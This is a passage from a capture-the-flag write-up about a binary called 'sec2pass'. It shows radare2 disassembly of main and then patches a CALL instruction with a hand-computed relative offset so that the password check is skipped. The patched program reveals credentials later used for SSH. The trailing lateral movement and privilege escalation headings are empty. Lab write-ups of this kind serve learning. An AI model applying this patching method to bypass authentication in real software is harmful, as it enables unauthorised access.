│           0x0000315b      4889c2         mov rdx, rax
│           0x0000315e      488d85f0fb..   lea rax, [var_410h]
│           0x00003165      4801d0         add rax, rdx
│           0x00003168      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000316d      488b150c31..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x00003174      488d85f0fb..   lea rax, [var_410h]
│           0x0000317b      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000317e      4889c7         mov rdi, rax                ; char *s1
│           0x00003181      e89aefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003186      488d85f0fb..   lea rax, [var_410h]
│           0x0000318d      4889c7         mov rdi, rax                ; const char *s
│           0x00003190      e8cbeeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003195      4889c2         mov rdx, rax
│           0x00003198      488d85f0fb..   lea rax, [var_410h]
│           0x0000319f      4801d0         add rax, rdx
│           0x000031a2      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x000031a7      488b15da30..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000031ae      488d85f0fb..   lea rax, [var_410h]
│           0x000031b5      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031b8      4889c7         mov rdi, rax                ; char *s1
│           0x000031bb      e860efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031c0      488b15c930..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000031c7      488d85f0fb..   lea rax, [var_410h]
│           0x000031ce      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031d1      4889c7         mov rdi, rax                ; char *s1
│           0x000031d4      e847efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031d9      488b15b830..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000031e0      488d85f0fb..   lea rax, [var_410h]
│           0x000031e7      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031ea      4889c7         mov rdi, rax                ; char *s1
│           0x000031ed      e82eefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031f2      488d85f0fb..   lea rax, [var_410h]
│           0x000031f9      4889c7         mov rdi, rax                ; const char *s
│           0x000031fc      e85feeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003201      4889c2         mov rdx, rax
│           0x00003204      488d85f0fb..   lea rax, [var_410h]
│           0x0000320b      4801d0         add rax, rdx
│           0x0000320e      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003213      488b153630..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x0000321a      488d85f0fb..   lea rax, [var_410h]
│           0x00003221      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003224      4889c7         mov rdi, rax                ; char *s1
│           0x00003227      e8f4eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000322c      488b152530..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00003233      488d85f0fb..   lea rax, [var_410h]
│           0x0000323a      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000323d      4889c7         mov rdi, rax                ; char *s1
│           0x00003240      e8dbeeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003245      488b151430..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x0000324c      488d85f0fb..   lea rax, [var_410h]
│           0x00003253      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003256      4889c7         mov rdi, rax                ; char *s1
│           0x00003259      e8c2eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000325e      488b156330..   mov rdx, qword [obj.ASMQXZ] ; [0x62c8:8]=0x4229 ; ")B"
│           0x00003265      488d85f0fb..   lea rax, [var_410h]
│           0x0000326c      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000326f      4889c7         mov rdi, rax                ; char *s1
│           0x00003272      e8a9eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003277      488b153230..   mov rdx, qword [obj.POIKJ]  ; [0x62b0:8]=0x4222 ; "\"B"
│           0x0000327e      488d85f0fb..   lea rax, [var_410h]
│           0x00003285      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003288      4889c7         mov rdi, rax                ; char *s1
│           0x0000328b      e890eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003290      488b151130..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00003297      488d85f0fb..   lea rax, [var_410h]
│           0x0000329e      4889d6         mov rsi, rdx                ; const char *s2
│           0x000032a1      4889c7         mov rdi, rax                ; char *s1
│           0x000032a4      e877eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000032a9      b800000000     mov eax, 0
│           0x000032ae      e848f3ffff     call sym.fn2
│           0x000032b3      488d85f0ef..   lea rax, [format]
│           0x000032ba      4889c7         mov rdi, rax                ; const char *format
│           0x000032bd      b800000000     mov eax, 0
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ce      4889c6         mov rsi, rax
│           0x000032d1      488d05550f..   lea rax, [0x0000422d]       ; "%s"
│           0x000032d8      4889c7         mov rdi, rax                ; const char *format
│           0x000032db      b800000000     mov eax, 0
│           0x000032e0      e8dbedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x000032e5      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ec      4889c7         mov rdi, rax                ; char *arg1
│           0x000032ef      e85ff5ffff     call sym.b6v4c8
│           0x000032f4      85c0           test eax, eax
│       ┌─< 0x000032f6      751b           jne 0x3313
│       │   0x000032f8      488d85f0f3..   lea rax, [s]
│       │   0x000032ff      4889c7         mov rdi, rax                ; const char *format
│       │   0x00003302      b800000000     mov eax, 0
│       │   0x00003307      e824edffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0000330c      b801000000     mov eax, 1
│      ┌──< 0x00003311      eb6f           jmp 0x3382
│      ││   ; CODE XREF from main @ 0x32f6(x)
│      │└─> 0x00003313      488d85f0f7..   lea rax, [var_810h]
│      │    0x0000331a      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000331d      b800000000     mov eax, 0
│      │    0x00003322      e809edffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x00003327      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000332e      4889c6         mov rsi, rax
│      │    0x00003331      488d05f50e..   lea rax, [0x0000422d]       ; "%s"
│      │    0x00003338      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000333b      b800000000     mov eax, 0
│      │    0x00003340      e87bedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│      │    0x00003345      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000334c      4889c7         mov rdi, rax                ; char *arg1
│      │    0x0000334f      e88af5ffff     call sym.x1w5z9
│      │    0x00003354      85c0           test eax, eax
│      │┌─< 0x00003356      751b           jne 0x3373
│      ││   0x00003358      488d85f0fb..   lea rax, [var_410h]
│      ││   0x0000335f      4889c7         mov rdi, rax                ; const char *format
│      ││   0x00003362      b800000000     mov eax, 0
│      ││   0x00003367      e8c4ecffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x0000336c      b801000000     mov eax, 1
│     ┌───< 0x00003371      eb0f           jmp 0x3382
│     │││   ; CODE XREF from main @ 0x3356(x)
│     ││└─> 0x00003373      b800000000     mov eax, 0
│     ││    0x00003378      e8ecf5ffff     call sym.k8j4h3
│     ││    0x0000337d      b800000000     mov eax, 0
│     ││    ; CODE XREFS from main @ 0x3311(x), 0x3371(x)
│     └└──> 0x00003382      488b55f8       mov rdx, qword [canary]
│           0x00003386      64482b1425..   sub rdx, qword fs:[0x28]
│       ┌─< 0x0000338f      7405           je 0x3396
│       │   0x00003391      e81aedffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x338f(x)
│       └─> 0x00003396      c9             leave
└           0x00003397      c3             ret
[0x00002ccf]>
```

We navigate through the compiled code until we locate the CALL instruction that calls the first printf function and its next instruction.

```bash
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
```

Then we will look for the address of the k8j4h3() function, which is the one called once the verification system is passed.

```bash
is~k8j4h3
```
```bash
59  0x00002969 0x00002969 GLOBAL FUNC   870      k8j4h3
```

With this information we now need to calculate the relative offset from the k8j4h3() function to the memory address 0x000032c7

```
offset = address of the destination function - address of the instruction following the CALL

offset = 0x00002969 - 0x000032c7 = -0x95E
```

Now we must encode the offset in the CALL instruction in 2's complement

```
We take the absolute offset 0x95E and convert it to binary

0x95E= 1001 0101 1110

we invert the bits and add +1

1001 0101 1110= 0110 1010 0001 + 1 = 0110 1010 0010

we convert the result into hexadecimal

0110 1010 0010 = 0x6a2

But since we need 4 bytes, we complement on the left with "f"

0x6a2 = 0xfffff6a2

we convert to little endian format

ff ff f6 a2 = a2 f6 ff ff

we add the CALL instruction

final_result= e8a2f6ffff

```

We now have the relative offset to replace the call to the printf function with the k8j4h3() function. 

```bash
s 0x000032c2
wx e8a2f6ffff
pd 1 @ 0x000032c2
```
```bash
│           0x000032c2      e8a2f6ffff     call sym.k8j4h3
```

The call to the function we want has been successfully overwritten. We exit and run the program again

```
quit
./sec2pass
```

![image](https://github.com/user-attachments/assets/c134722b-fd6b-4d99-acbb-78a1462c5ea8)

We have skipped the verification and after testing the credentials, the only ones that turn out to be valid are Carlos's through the SSH service.

# Lateral Movement (optional)

## carlos


# Privilege Escalation

## pedro

